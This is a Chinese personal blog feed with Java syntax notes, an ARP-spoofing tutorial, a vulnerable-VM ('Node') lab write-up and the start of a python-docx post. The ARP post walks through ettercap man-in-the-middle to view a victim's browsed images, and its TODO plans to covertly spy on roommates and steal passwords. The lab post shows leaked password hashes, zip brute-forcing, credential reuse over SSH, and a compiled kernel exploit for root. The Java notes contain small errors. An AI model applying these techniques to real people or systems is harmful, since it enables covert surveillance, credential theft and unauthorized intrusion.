<h2 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h2><h3 id="类的声明公式"><a href="#类的声明公式" class="headerlink" title="类的声明公式"></a>类的声明公式</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[可见度] class ClassName [extends 一个类的名字] [implements 若干个 interface 的名字] &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="对象默认父类-–-Object"><a href="#对象默认父类-–-Object" class="headerlink" title="对象默认父类 – Object"></a>对象默认父类 – Object</h3><ul>
<li>clone() 拷贝</li>
<li>equals(Object obj) 判断对象是否相等</li>
<li>finalize() 相当于析构函数</li>
<li>getClass() 获取类的相关信息</li>
<li>hashCode() 获取对象的哈希值</li>
<li>toString() 类转为字符串</li>
</ul>
<h3 id="a-istanceof-B"><a href="#a-istanceof-B" class="headerlink" title="a istanceof B"></a>a istanceof B</h3><p>返回一个boolean : a(实例) 是否是 B(class) 的实例.<br>如果 B 是 A 的父类, <code>a istanceof B</code> 仍然为 true.<br>但如果 A 是 B 的父类, 该表达式为假.</p>
<h3 id="override"><a href="#override" class="headerlink" title="@override"></a>@override</h3><p>在子类的函数名前使用<code>@override</code>, 编译器会自动检查父类中有没有同名的方法供子类override. 若没有, 则直接报错.</p>
<blockquote>
<p>重写是子类对父类的允许访问的方法的实现过程进行重新编写, 返回值和形参都不能改变。即外壳不变，核心重写!</p>
</blockquote>
<h3 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h3><ol>
<li>类似C++的构造函数(不再赘述)</li>
<li><code>this()</code>构造函数, 只能在构造函数中调用其它构造函数时使用.(且必须写在第一行)<br> 与通常的构造函数不同, this()不会产生新的对象, 而是对自身属性进行修改.</li>
<li><code>super()</code>: 与<code>this()</code>类似, 显式调用父类的构造函数.<br> 不然会默认调用父类的无参构造函数.inal </li>
<li>只要类中显示定义了一个构造函数, 则不会产生默认无参构造函数.</li>
</ol>
<h3 id="静态"><a href="#静态" class="headerlink" title="静态"></a>静态</h3><ul>
<li><code>static{}</code> 代码块仅在类被加载时执行一次</li>
<li>static 静态方法会失去多态特性.</li>
</ul>
<h3 id="final"><a href="#final" class="headerlink" title="final"></a>final</h3><ul>
<li>final 类</li>
<li>final 方法 </li>
<li>final 变量</li>
</ul>
<h3 id="接口的声明"><a href="#接口的声明" class="headerlink" title="接口的声明"></a>接口的声明</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">interface A [extends ...其它接口名...]&#123;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><ul>
<li><p>关键字 </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> e</span><br><span class="line">    <span class="comment">/* 亦可能在方法中抛出 */</span></span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">    <span class="comment">/* 异常处理 */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">final</span>&#123;<span class="comment">/*无论是否有异常都会执行*/</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>一个函数若可能抛出异常: </p>
  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">function</span><span class="params">()</span> <span class="keyword">throws</span> exceptions</span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> Exception()</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>  则调用该方法的地方都要try, catch.<br>  <strong>除了RuntimeException</strong></p>
</li>
<li><p>异常实例的方法 <code>e.getMessage()</code> 可以获得异常信息. </p>
</li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> java </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[arp欺骗 初见]]></title>
      <url>/2019/09/12/ettercap/</url>
      <content type="html"><![CDATA[<p>实现了我多年的愿望.</p>
<a id="more"></a>

<h1 id="DNS劫持"><a href="#DNS劫持" class="headerlink" title="DNS劫持"></a>DNS劫持</h1><h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>暑假的时候看见ljy大佬qq空间里发了个黑掉酒店摄像头的说说, </p>
<p>当时非常震撼, 也特别想学.</p>
<p>wyz学长告诉我说很可能是通过中间人攻击的手段实现的(现在看来确实很有可能), 推荐我学习下ettercap的使用方法.</p>
<p>当时为了做到这点, 我用了好几天的时间来尝试, </p>
<p>从 Kali 到 Windows,<br>从 虚拟机 到 物理机,<br>从 NAT 模式到 桥接模式,<br>从 卸载 到 重新安装,<br>从 搜百度 到 查谷歌,<br>从 虚拟机崩溃 到 我本人崩溃 …</p>
<p>反正就是好几天没干别的就鼓捣这玩意儿了, </p>
<p>后来 yw老哥 在社团宣讲的时候演示了相关的技术, 遂找他问了问, 说是有可能是网卡的问题, 咱也不管是不是吧, 反正最后我是信了.</p>
<p>这不今天的新网卡(某宝二十多买的)到了, 迫不及待的尝试我期待已久的中间人攻击.</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
<li>路由器(以下所有设备均连接至此) : <ul>
<li>手机热点 :<br>  ip : 192.168.43.1</li>
</ul>
</li>
<li>攻击机 : <ul>
<li>Vmware 虚拟机 :<br>  操作系统 : Kali<br>  ip : 192.168.43.214</li>
</ul>
</li>
<li>攻击目标 :<ul>
<li>物理机:(目标A)<br>  操作系统 : Windows<br>  ip : 192.168.43.170</li>
<li>手机 :(目标B)<br>  操作系统 : Android<br>  ip : 192.168.43.1</li>
</ul>
</li>
</ul>
<p>测试的目标是通过中间人攻击(arp欺骗)来实现监视 A 所浏览的图片.</p>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol>
<li>开启数据包转发</li>
</ol>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>

<p>这一步非常重要! </p>
<p>我当初认为数据包的转发是由软件 ettercap 完成的,</p>
<p>但是在百度上无意间看到是操作系统完成的,.</p>
<p>如果不开启这个的话, 被攻击的设备将无法连接网络, 没法进一步攻击.</p>
<p>(当初因为这个浪费不少时间)</p>
<ol start="2">
<li><p>启动 ettercap</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -G</span><br></pre></td></tr></table></figure>
</li>
<li><p>选择 sniff-Unified, 这里选择我们的网卡wlan0,然后点击OK</p>
</li>
<li><p>点击Hosts, 首先选择Scan for hosts, 扫描一下局域网里面主机, 然后我们在点击Hosts里面的Hosts list. 正常情况下会出现至少我刚才提到的两个ip地址. (既然这么说就有不正常情况, 有时候会扫不出刚才的ip, 原因不明)</p>
</li>
<li><p>A 的地址加入到 target1, B 的地址加入到 target2.</p>
</li>
<li><p>选择Mitm-ARP poisoning.</p>
</li>
<li><p>选择Sniff remote connections, 最后Start.</p>
</li>
<li><p>开启新的shell, 启动 driftnet,</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driftnet -i wlan0</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>这时, 当 A 浏览图片时, Kali 上就会出现那些图片.</p>
<p>爽~~</p>
<h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><ul>
<li><p>有时间可以尝试偷偷监听室友们的, 看看能不能做到不被发现的完成目的,<br>想想就刺激.</p>
</li>
<li><p>尝试截获其它的数据, 包括但不限于视频流, 各种密码.</p>
</li>
<li><p>DNS污染, 将所有的http请求都解析到我的博客网址.</p>
</li>
</ul>
<p>要不是现在已经半夜一点了, 真想现在就试试. </p>
<p>然而明天又一天课, MD, 睡觉了.</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
            <tag> 中间人攻击 </tag>
            
            <tag> arp欺骗 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Node靶机练习]]></title>
      <url>/2019/09/08/Node%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p>只是一次练习.</p>
<a id="more"></a>
<h1 id="Node-靶机练习"><a href="#Node-靶机练习" class="headerlink" title="Node 靶机练习"></a>Node 靶机练习</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
<li>靶机名: Ubuntu 16.04.3 TLS node tty1</li>
<li>运行环境: Vmware virtual machine</li>
</ul>
<hr>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><ul>
<li>扫描内网<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\MECHREVO&gt;nmap -sP 192.168.126.0/24</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-26 11:38 ?D1ú±ê×?ê±??</span><br><span class="line">Stats: 0:00:13 elapsed; 0 hosts completed (0 up), 254 undergoing ARP Ping Scan</span><br><span class="line">Parallel DNS resolution of 254 hosts. Timing: About 50.00% done; ETC: 11:38 (0:00:00 remaining)</span><br><span class="line">Stats: 0:00:18 elapsed; 0 hosts completed (0 up), 254 undergoing ARP Ping Scan</span><br><span class="line">Parallel DNS resolution of 254 hosts. Timing: About 50.00% done; ETC: 11:38 (0:00:05 remaining)</span><br><span class="line">Nmap scan report for 192.168.126.134 (192.168.126.134)</span><br><span class="line">Host is up (0.00s latency).</span><br><span class="line">MAC Address: 00:0C:29:F3:9B:1C (VMware)</span><br><span class="line">Nmap scan report for 192.168.126.254 (192.168.126.254)</span><br><span class="line">Host is up (0.00s latency).</span><br><span class="line">MAC Address: 00:50:56:FF:09:F7 (VMware)</span><br><span class="line">Nmap scan report for 192.168.126.1 (192.168.126.1)</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (3 hosts up) scanned in 24.61 seconds</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>找到靶机ip地址: 192.168.126.134</p>
<ul>
<li>扫描端口<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\MECHREVO&gt;nmap -A -p- 192.168.126.134</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-26 11:51 ?D1ú±ê×?ê±??</span><br><span class="line">Stats: 0:01:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About 41.55% done; ETC: 11:54 (0:01:16 remaining)</span><br><span class="line">Nmap scan report for 192.168.126.134 (192.168.126.134)</span><br><span class="line">Host is up (0.00028s latency).</span><br><span class="line">Not shown: 65533 filtered ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)</span><br><span class="line">|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)</span><br><span class="line">|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)</span><br><span class="line">3000/tcp open  http    Node.js Express framework</span><br><span class="line">| hadoop-datanode-info:</span><br><span class="line">|_  Logs: /login</span><br><span class="line">| hadoop-tasktracker-info:</span><br><span class="line">|_  Logs: /login</span><br><span class="line">|_http-title: MyPlace</span><br><span class="line">MAC Address: 00:0C:29:F3:9B:1C (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.28 ms 192.168.126.134 (192.168.126.134)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 134.81 seconds</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>开放了两个端口: 22 和 3000, 22端口是ssh端口, 3000端口就是node.js的默认端口.</p>
<p>用浏览器访问192.168.126.134:3000.<br>抓包看看, 好像没有什么可疑的地方.</p>
<p>尝试扫描目录:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">D:\dirsearch&gt;python dirsearch.py -u http://192.168.126.134:3000/ -e *</span><br><span class="line"></span><br><span class="line"> _|. _ _  _  _  _ _|_    v0.3.8</span><br><span class="line">(_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: * | HTTP method: get | Threads: 10 | Wordlist size: 6087</span><br><span class="line"></span><br><span class="line">Error Log: D:\学习资料\Python——为了守护我爱的人，我将运行一个牛逼的脚本\dirsearch\logs\errors-19-07-26_12-04-21.log</span><br><span class="line"></span><br><span class="line">Target: http://192.168.126.134:3000/</span><br><span class="line"></span><br><span class="line">[12:04:21] Starting:</span><br><span class="line">[12:04:38] 301 -  171B  - /assets  -&gt;  /assets/</span><br><span class="line">[12:05:16] 301 -  173B  - /uploads  -&gt;  /uploads/</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>

<p>分别看下两个目录, 里面都是些网站上的资源. 没有有价值的东西.</p>
<ul>
<li>通过查看<code>/api/users/latest</code>, 找到了三个账号.<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;_id&quot;:&quot;59a7368398aa325cc03ee51d&quot;,&quot;username&quot;:&quot;tom&quot;,</span><br><span class="line">&quot;password&quot;:&quot;f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240&quot;,&quot;is_admin&quot;:false&#125;,</span><br><span class="line">&#123;&quot;_id&quot;:&quot;59a7368e98aa325cc03ee51e&quot;,&quot;username&quot;:&quot;mark&quot;,</span><br><span class="line">&quot;password&quot;:&quot;de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73&quot;,&quot;is_admin&quot;:false&#125;,</span><br><span class="line">&#123;&quot;_id&quot;:&quot;59aa9781cced6f1d1490fce9&quot;,&quot;username&quot;:&quot;rastating&quot;,</span><br><span class="line">&quot;password&quot;:&quot;5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0&quot;,&quot;is_admin&quot;:false&#125;]</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>其中的密码经md5加密, 且最后一个无法破解.</p>
<p>但是只要有一个账号就可以了. </p>
<p><code>md5_decode(&#39;f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240&#39;) =&gt; spongebob</code><br>登录进tom的账号后. 发现没有管理员权限, 还是啥也干不了…</p>
<p>网上查了一下攻略, 此处应该访问<code>/api/users/</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;_id&quot;:&quot;59a7365b98aa325cc03ee51c&quot;,&quot;username&quot;:&quot;myP14ceAdm1nAcc0uNT&quot;,</span><br><span class="line">&quot;password&quot;:&quot;dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af&quot;,&quot;is_admin&quot;:true&#125;]</span><br></pre></td></tr></table></figure>

<p>密码md5解密<br><code>md5_decode(&#39;dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af&#39;) =&gt; &#39;manchester&#39;</code></p>
<p>这下有了admin账号了.</p>
<p>登录后可以下载网站源码<code>MyPlace.backup</code>.  </p>
<p>但是确实base64编码的. 我尝试用网上的在线解码网站, 但是效果不理想.</p>
<p>其实直接用php就可以很方便的解码并保存在文件中, 如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$file = <span class="string">" /* base64 编码的文件内容 */ "</span>;</span><br><span class="line">$result = base64_decode($file);</span><br><span class="line">file_put_contents(<span class="string">"result.txt"</span>,$result);</span><br></pre></td></tr></table></figure>

<p>解码之后打开一看是乱码, 但是前两个字符是’PK’, 所以应该是个zip压缩文件. 只要把上面的<code>result.txt</code>直接改成<code>result.zip</code>再跑一下就可以.</p>
<p>压缩包需要密码, 还需要研究下zip的密码破解.</p>
<hr>
<p>小插曲</p>
<p>刚才午睡的时候, 我回到了高中的时光,</p>
<p>我梦见了一个让我心动的, 但又陌生的姑娘在我的班上,</p>
<p>她在哭, 哭的很伤心, 在自己的座位上,</p>
<p>我很想安慰她, 但</p>
<p>我只是一次又一次的经过她, </p>
<p>不敢和她说话, 不敢递给她一张纸巾,</p>
<p>她是那么无助, 我也无能为力,</p>
<p>直到梦醒, 我都不知道她的名字,</p>
<p>也许, 我再也遇不见她了吧…</p>
<hr>
<p>网上有很多在线破解压缩文件密码的网站, 可基本都是要钱的…</p>
<p>Windows下的一个破解工具—-<code>Password Unlocker</code>, 亲测不好用, 建议避雷.</p>
<p>可以用kali中的一个工具<code>fcrackzip</code>来进行破解.</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -v -b -u -c a -p magicaaaa myplace</span><br></pre></td></tr></table></figure>

<ul>
<li>-v : 详细信息</li>
<li>-b : 爆破</li>
<li>-u : 指定zip压缩格式(大概)</li>
<li>-c : 指定密码类型, 选项值 a 就是纯字符串, 1 就是纯数字, a1 就是数字和字符串混杂.</li>
<li>-p : 指定密码, magicaaaa就是前五位确定是magic了, 后面的a在这里是掩码, 表明这4位是字母.</li>
<li>myplace : 要破解的压缩包的名称.</li>
</ul>
<p>上面的是遍历爆破, 效率估计不高, gxy学长告诉了我fcrackzip也支持跑字典, </p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt myplace.zip</span><br></pre></td></tr></table></figure>

<p>其中的这个 rockyou.txt 估计以后也能用到.</p>
<p>最后得到密码 <code>magicword</code></p>
<p>解压缩后, myplace里是用<code>node.js</code>框架搭建的网站源码(终于知道靶机名字的由来了.)</p>
<p>然后我对node.js也不是很熟悉, 在百度中了解到, 这个框架的项目入口和程序启动文件是<code>app.js</code>.</p>
<p>打开一看, 里面有个连接MongoDB的账户和密码.<br><code>const url = &#39;mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&amp;authSource=myplace&#39;;</code></p>
<p>顺便了解了一下, MongoDB和Mysql差不多, 都是数据库管理系统, 只是类型有所不同.</p>
<p>奇怪的是, 这个数据库的账号和密码和linxu的账号和密码是相同的, 我们可以直接ssh登录进靶机的系统了.(这或许也是个套路, 以后可以尝试)</p>
<p>进入到web目录下, 整个目录的权限都在root那里, 我们没法写文件, 自然也没法留后门. 下面需要对ubuntu进行提权.</p>
<p>首先查看系统信息.</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mark@node:/var/www/myplace$ cat /etc/issue</span><br><span class="line">Ubuntu 16.04.3 LTS \n \l</span><br></pre></td></tr></table></figure>

<p>在 kali msfconsole 中查找相关的漏洞</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu 16.04</span><br><span class="line">[*] <span class="built_in">exec</span>: searchsploit Ubuntu 16.04</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                                                       |  Path</span><br><span class="line">                                                                                                                     | (/usr/share/exploitdb/)</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Apport 2.x (Ubuntu Desktop 12.10 &lt; 16.04) - Local Code Execution                                                     | exploits/linux/<span class="built_in">local</span>/40937.txt</span><br><span class="line">Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Privilege Escalation                                                        | exploits/linux/<span class="built_in">local</span>/40054.c</span><br><span class="line">Google Chrome (Fedora 25 / Ubuntu 16.04) - <span class="string">'tracker-extract'</span> / <span class="string">'gnome-video-thumbnailer'</span> + <span class="string">'totem'</span> Drive-By Download | exploits/linux/<span class="built_in">local</span>/40943.txt</span><br><span class="line">LightDM (Ubuntu 16.04/16.10) - <span class="string">'Guest Account'</span> Local Privilege Escalation                                            | exploits/linux/<span class="built_in">local</span>/41923.txt</span><br><span class="line">Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 / CentOS 7.3.1611) - <span class="string">'ldso_hwcap_64 S | exploits/linux_x86-64/local/42275.c</span></span><br><span class="line"><span class="string">Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - '</span>ldso_dynamic Stack Clash<span class="string">' Local Privi | exploits/linux_x86/local/42276.c</span></span><br><span class="line"><span class="string">Linux Kernel (Ubuntu 16.04) - Reference Count Overflow Using BPF Maps                                                | exploits/linux/dos/39773.txt</span></span><br><span class="line"><span class="string">Linux Kernel 4.14.7 (Ubuntu 16.04 / CentOS 7) - (KASLR &amp; SMEP Bypass) Arbitrary File Read                            | exploits/linux/local/45175.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4 (Ubuntu 16.04) - '</span>BPF<span class="string">' Local Privilege Escalation (Metasploit)                                      | exploits/linux/local/40759.rb</span></span><br><span class="line"><span class="string">Linux Kernel 4.4 (Ubuntu 16.04) - '</span>snd_timer_user_ccallback()<span class="string">' Kernel Pointer Leak                                   | exploits/linux/dos/46529.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - '</span>AF_PACKET<span class="string">' Race Condition Privilege Escalation                     | exploits/linux_x86-64/local/40871.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter target_offset Out-of-Bounds Privilege Escalation                | exploits/linux_x86-64/local/40049.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.x (Ubuntu 16.04) - '</span>double-fdput()<span class="string">' bpf(BPF_PROG_LOAD) Privilege Escalation                         | exploits/linux/local/39772.txt</span></span><br><span class="line"><span class="string">Linux Kernel 4.6.2 (Ubuntu 16.04.1) - '</span>IP6T_SO_SET_REPLACE<span class="string">' Local Privilege Escalation                               | exploits/linux/local/40489.txt</span></span><br><span class="line"><span class="string">Linux Kernel 4.8 (Ubuntu 16.04) - Leak sctp Kernel Pointer                                                           | exploits/linux/dos/45919.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                        | exploits/linux/local/45010.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                               | exploits/linux/local/44298.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x64) - '</span>netfilter target_offset<span class="string">' Local Privilege Escalation                    | exploits/linux/local/44300.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                | exploits/linux/local/43418.c</span></span><br><span class="line"><span class="string">--------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span></span><br><span class="line"><span class="string">Shellcodes: No Result</span></span><br></pre></td></tr></table></figure>

<p>使用<code>local Privilege Escalation</code>来进行提权.</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp /usr/share/exploitdb/exploits/linux/<span class="built_in">local</span>/44298.c mark@192.168.6.128:/tmp/</span><br></pre></td></tr></table></figure>

<p>(tmp对权限的限制较少, 所以复制到这个目录下).<br>执行命令后, 目录中已经多了这个c源文件, 还需要编译才能成为可以运行的exp</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread 44298.c -o exp -lcrypt</span><br></pre></td></tr></table></figure>

<p>这里有个两个陌生的命令选项 </p>
<ul>
<li><code>-pthread</code>, 百度了下, 有了这个选项后, 编译器在编译时会选择线程安全的实现, 具体的咱也别管了, 反正先加上就好…</li>
<li><code>-lcrypt</code>, 这里-l是选项, crypt是参数值. 表示链接时搜索名为crypt的库.</li>
</ul>
<p>编译后出现了个exp, 运行后, 我们已经是root了.</p>
<p>下面要学习下如何在node.js网站框架留下后门.</p>
<p>(未完待续…)</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
            <tag> linux提权 </tag>
            
            <tag> metasploit </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python自动化处理word文档]]></title>
      <url>/2019/08/29/python%E8%87%AA%E5%8A%A8%E5%8C%96%E5%A4%84%E7%90%86word%E6%96%87%E6%A1%A3/</url>
      <content type="html"><![CDATA[<p>帮室友写了个脚本, 感觉还不错, 分享一波源码.</p>
<a id="more"></a>

<h1 id="python-docx"><a href="#python-docx" class="headerlink" title="python + docx"></a>python + docx</h1><h2 id="前因"><a href="#前因" class="headerlink" title="前因"></a>前因</h2><p>宿舍马大佬这两天在忙学生综合素质测评的工作. 马大佬给我们发了个word表格让我们填. </p>
<p>然而word表格不像execl, 它很不好计算. </p>
<p>为了减轻马大佬的工作量, 我帮马大佬用python写个程序, 读取二十多个word文件, 并提取其中的数据自动计算并生成目标文件作为结果. </p>
<p>经过投入使用, 最终效果还不错.</p>
